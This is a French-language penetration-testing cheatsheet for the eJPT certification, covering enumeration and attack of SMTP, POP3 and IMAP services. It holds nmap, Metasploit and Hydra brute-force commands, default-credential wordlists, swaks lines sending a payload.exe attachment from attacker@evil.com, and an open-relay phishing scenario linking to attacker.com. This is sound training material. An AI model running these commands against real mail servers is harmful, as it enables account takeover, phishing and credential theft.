# 📧 SMTP, POP3 & IMAP Enumeration - Cheatsheet eJPT

## 📮 1. SMTP (Ports 25, 587, 465) - Énumération & Exploitation

### Scripts Nmap pour SMTP
| Script | Description | Usage |
|--------|-------------|-------|
| `smtp-commands` | Commandes SMTP supportées | `nmap --script smtp-commands target` |
| `smtp-enum-users` | Énumération utilisateurs | `nmap --script smtp-enum-users target` |
| `smtp-ntlm-info` | Informations NTLM | `nmap --script smtp-ntlm-info target` |
| `smtp-open-relay` | Test open relay | `nmap --script smtp-open-relay target` |
| `smtp-strangeport` | SMTP sur port non-standard | `nmap --script smtp-strangeport target` |
| `smtp-brute` | Brute force SMTP | `nmap --script smtp-brute target` |

### Commandes Nmap SMTP essentielles
```bash
# Énumération SMTP complète
nmap -p25,587,465 --script smtp-* target

# Énumération de base
nmap -p25 -sV --script smtp-commands,smtp-enum-users target

# Test open relay (critique)
nmap -p25 --script smtp-open-relay target

# Énumération utilisateurs avec wordlist
nmap --script smtp-enum-users --script-args userdb=users.txt target

# Banner grabbing SMTP
nc target 25
telnet target 25
```

### Modules Metasploit SMTP
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/smtp/smtp_version` | Version SMTP | `use auxiliary/scanner/smtp/smtp_version` |
| `auxiliary/scanner/smtp/smtp_enum` | Énumération utilisateurs | `use auxiliary/scanner/smtp/smtp_enum` |
| `auxiliary/scanner/smtp/smtp_relay` | Test relay SMTP | `use auxiliary/scanner/smtp/smtp_relay` |
| `auxiliary/admin/smtp/sendmail_exec` | Sendmail exploitation | `use auxiliary/admin/smtp/sendmail_exec` |

### Workflow Metasploit SMTP
```bash
# 1. Détection version SMTP
use auxiliary/scanner/smtp/smtp_version
set RHOSTS target
run

# 2. Énumération utilisateurs
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS target
set USER_FILE /usr/share/seclists/Usernames/Names/names.txt
run

# 3. Test open relay
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS target
run
```

### Énumération manuelle SMTP
```bash
# Connexion SMTP
telnet target 25
nc target 25

# Commandes SMTP utiles
HELO attacker.com                    # Salutation
EHLO attacker.com                    # Extended HELO
HELP                                 # Aide commandes
VRFY user                            # Vérifier utilisateur
EXPN user                            # Expand mailing list
RCPT TO: user@domain.com             # Destinataire
QUIT                                 # Quitter

# Test open relay
MAIL FROM: test@attacker.com
RCPT TO: victim@external.com
DATA
Subject: Test
Test message
.
```

### Énumération utilisateurs SMTP
```bash
# smtp-user-enum (outil spécialisé)
smtp-user-enum -M VRFY -U users.txt -t target
smtp-user-enum -M EXPN -U users.txt -t target
smtp-user-enum -M RCPT -U users.txt -t target

# Test manuel VRFY
telnet target 25
VRFY admin
VRFY root
VRFY administrator

# Script automatisé
for user in admin root user test; do
  echo "VRFY $user" | nc target 25
done
```

### Brute Force SMTP avec Hydra
```bash
# Brute force SMTP AUTH
hydra -l admin -P passwords.txt smtp://target

# Avec liste d'utilisateurs
hydra -L users.txt -P passwords.txt smtp://target

# SMTP sur port non-standard
hydra -l admin -P passwords.txt -s 587 smtp://target

# Options recommandées
hydra -L users.txt -P passwords.txt -t 16 -f smtp://target
```

---

## 📥 2. POP3 (Port 110) & POP3S (Port 995) - Énumération & Exploitation

### Scripts Nmap pour POP3
| Script | Description | Usage |
|--------|-------------|-------|
| `pop3-capabilities` | Capacités POP3 | `nmap --script pop3-capabilities target` |
| `pop3-ntlm-info` | Informations NTLM | `nmap --script pop3-ntlm-info target` |
| `pop3-brute` | Brute force POP3 | `nmap --script pop3-brute target` |

### Commandes Nmap POP3
```bash
# Énumération POP3
nmap -p110,995 --script pop3-* target

# Banner grabbing
nc target 110
telnet target 110

# POP3S (SSL)
openssl s_client -connect target:995
```

### Modules Metasploit POP3
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/pop3/pop3_version` | Version POP3 | `use auxiliary/scanner/pop3/pop3_version` |
| `auxiliary/scanner/pop3/pop3_login` | Brute force POP3 | `use auxiliary/scanner/pop3/pop3_login` |

### Workflow Metasploit POP3
```bash
# 1. Détection version
use auxiliary/scanner/pop3/pop3_version
set RHOSTS target
run

# 2. Brute force
use auxiliary/scanner/pop3/pop3_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Énumération manuelle POP3
```bash
# Connexion POP3
telnet target 110

# Commandes POP3
USER username                        # Nom d'utilisateur
PASS password                        # Mot de passe
STAT                                 # Statistiques mailbox
LIST                                 # Liste des messages
RETR 1                               # Récupérer message 1
DELE 1                               # Supprimer message 1
QUIT                                 # Quitter

# Test de connexion
telnet target 110
USER admin
PASS password123
STAT
LIST
```

### Brute Force POP3 avec Hydra
```bash
# Brute force POP3
hydra -l admin -P passwords.txt pop3://target

# Avec liste d'utilisateurs
hydra -L users.txt -P passwords.txt pop3://target

# POP3S (SSL)
hydra -l admin -P passwords.txt pop3s://target

# Options recommandées
hydra -L users.txt -P passwords.txt -t 16 -f pop3://target
```

---

## 📨 3. IMAP (Port 143) & IMAPS (Port 993) - Énumération & Exploitation

### Scripts Nmap pour IMAP
| Script | Description | Usage |
|--------|-------------|-------|
| `imap-capabilities` | Capacités IMAP | `nmap --script imap-capabilities target` |
| `imap-ntlm-info` | Informations NTLM | `nmap --script imap-ntlm-info target` |
| `imap-brute` | Brute force IMAP | `nmap --script imap-brute target` |

### Commandes Nmap IMAP
```bash
# Énumération IMAP
nmap -p143,993 --script imap-* target

# Banner grabbing
nc target 143
telnet target 143

# IMAPS (SSL)
openssl s_client -connect target:993
```

### Modules Metasploit IMAP
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/imap/imap_version` | Version IMAP | `use auxiliary/scanner/imap/imap_version` |
| `auxiliary/scanner/imap/imap_login` | Brute force IMAP | `use auxiliary/scanner/imap/imap_login` |

### Workflow Metasploit IMAP
```bash
# 1. Détection version
use auxiliary/scanner/imap/imap_version
set RHOSTS target
run

# 2. Brute force
use auxiliary/scanner/imap/imap_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Énumération manuelle IMAP
```bash
# Connexion IMAP
telnet target 143

# Commandes IMAP (préfixées par tag)
a001 LOGIN username password         # Authentification
a002 LIST "" "*"                     # Liste des mailboxes
a003 SELECT INBOX                    # Sélectionner INBOX
a004 SEARCH ALL                      # Rechercher tous messages
a005 FETCH 1 BODY[]                  # Récupérer message 1
a006 LOGOUT                          # Déconnexion

# Test de connexion
telnet target 143
a001 LOGIN admin password123
a002 LIST "" "*"
a003 SELECT INBOX
a004 SEARCH ALL
```

### Brute Force IMAP avec Hydra
```bash
# Brute force IMAP
hydra -l admin -P passwords.txt imap://target

# Avec liste d'utilisateurs
hydra -L users.txt -P passwords.txt imap://target

# IMAPS (SSL)
hydra -l admin -P passwords.txt imaps://target

# Options recommandées
hydra -L users.txt -P passwords.txt -t 16 -f imap://target
```

---

## 🔧 4. Outils spécialisés email

### Evolution Data Server (pour IMAP/POP3)
```bash
# Connexion IMAP avec evolution
evolution --offline

# Configuration manuelle
# Edit → Preferences → Mail Accounts → Add
```

### Thunderbird (Client email)
```bash
# Configuration manuelle
# File → New → Existing Mail Account
# Server: target, Port: 143/993/110/995
# Security: None/SSL/TLS
```

### swaks (Swiss Army Knife SMTP)
```bash
# Installation
apt install swaks

# Test SMTP basique
swaks --to victim@target.com --from attacker@evil.com --server target

# Avec authentification
swaks --to user@target.com --from user@target.com --server target --auth LOGIN --auth-user user --auth-password password

# Test open relay
swaks --to external@gmail.com --from fake@target.com --server target

# Avec attachment
swaks --to user@target.com --from attacker@evil.com --server target --attach payload.exe
```

---

## 🎯 5. Cas d'usage spécifiques eJPT

### Scénario 1: SMTP avec énumération utilisateurs
```bash
# 1. Découverte SMTP
nmap -p25,587 -sV target

# 2. Énumération utilisateurs
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t target

# 3. Test open relay
nmap --script smtp-open-relay target

# 4. Si utilisateurs trouvés → Brute force POP3/IMAP
hydra -L found_users.txt -P passwords.txt pop3://target
```

### Scénario 2: Serveur email avec credentials faibles
```bash
# 1. Discovery email services
nmap -p25,110,143,587,993,995 target

# 2. Test credentials courants
hydra -l admin -p admin pop3://target
hydra -l admin -p password imap://target

# 3. Si succès → Accès mailbox
telnet target 110
USER admin
PASS password
LIST
RETR 1
```

### Scénario 3: Open relay + phishing
```bash
# 1. Test open relay
swaks --to external@gmail.com --from CEO@target.com --server target

# 2. Si open relay → Phishing interne
swaks --to all-users@target.com --from IT@target.com --server target \
      --header "Subject: Password Reset Required" \
      --body "Click here: http://attacker.com/phish.php"
```

---

## 📋 6. Wordlists email spécialisées

### Utilisateurs email courants
```bash
cat > email_users.txt << EOF
admin
administrator
root
postmaster
mail
webmaster
info
contact
support
sales
marketing
hr
accounting
it
helpdesk
service
guest
user
test
demo
EOF
```

### Mots de passe email courants
```bash
cat > email_passwords.txt << EOF
password
123456
admin
mail
email
postfix
dovecot
sendmail
qmail
password123
admin123
mail123
welcome
changeme
default
service
EOF
```

---

## 💡 7. Conseils et astuces eJPT

### Workflow email recommandé
1. **Découverte** : `nmap -p25,110,143,587,993,995 -sV target`
2. **SMTP enum** : `smtp-user-enum -M VRFY -U users.txt -t target`
3. **Open relay** : `nmap --script smtp-open-relay target`
4. **Brute force** : `hydra -L users.txt -P passwords.txt pop3://target`
5. **Mailbox access** : Connexion manuelle pour lire emails

### Points critiques Email eJPT
- **SMTP user enum** très efficace avec VRFY/EXPN
- **Open relay** = faille critique souvent présente
- **Credentials faibles** fréquents (admin:admin, mail:mail)
- **POP3/IMAP** souvent non-chiffrés dans labs
- **Emails sensibles** peuvent contenir credentials/infos

### Erreurs courantes à éviter
- **Ignorer ports email SSL** (993, 995, 465)
- **Ne pas tester open relay**
- **Oublier user enumeration** SMTP
- **Brute force sans enum** préalable
- **Ne pas lire emails** après accès

### One-liners email essentiels
```bash
# Discovery email complet
nmap -p25,110,143,587,993,995 --script smtp-enum-users,smtp-open-relay,pop3-capabilities,imap-capabilities target

# Test credentials email courants
for service in pop3 imap; do hydra -l admin -p admin $service://target; done

# SMTP user enum rapide
echo -e "admin\nroot\nmail\nuser" | while read user; do echo "VRFY $user" | nc target 25; done
```

### Ports email à scanner systématiquement
```bash
# Ports email standards
25    # SMTP
110   # POP3
143   # IMAP
465   # SMTPS (SSL)
587   # SMTP (submission)
993   # IMAPS (SSL)
995   # POP3S (SSL)

# Scan one-liner
nmap -p25,110,143,465,587,993,995 -sV target
```

**🎯 Conseil final eJPT :** Les services email dans l'eJPT sont souvent mal configurés. Pattern typique : découverte → SMTP user enum → brute force POP3/IMAP → lecture emails pour infos sensibles. Open relay SMTP = faille critique à tester systématiquement !